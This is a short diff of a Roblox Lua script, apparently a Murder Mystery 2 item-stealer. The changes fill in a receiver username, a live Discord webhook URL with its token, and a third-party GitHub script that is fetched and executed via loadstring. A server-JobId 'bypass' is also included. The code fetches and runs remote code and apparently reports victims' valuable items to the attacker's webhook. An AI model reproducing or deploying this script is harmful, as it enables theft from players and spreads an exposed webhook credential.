@@ -1,8 +1,8 @@
-_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.Usernames = {"MM2danya7", "user2", "user3"} -- you can add as many as you'd like
 _G.min_rarity = "Godly"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/your_webhook_here" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1370815744719454229/-t8-ZNBEtooaJFXl2QEH_lAtrZU7tpgsg8lNjKW-VBItAybeXUWMOqcchv-RK2jEpkYh" -- change to your webhook
 
 -- Bypass для получения настоящего JobId
 game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
@@ -17,7 +17,7 @@ game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v
         print("Байпас сработал! Real JobId:", getgenv().RealJobId)
         
         -- Здесь будет запущен ваш основной скрипт
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/your_script_url/main.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/farm/refs/heads/main/bypass.lua"))()
         
     ]], serverId, serverId))
 end)
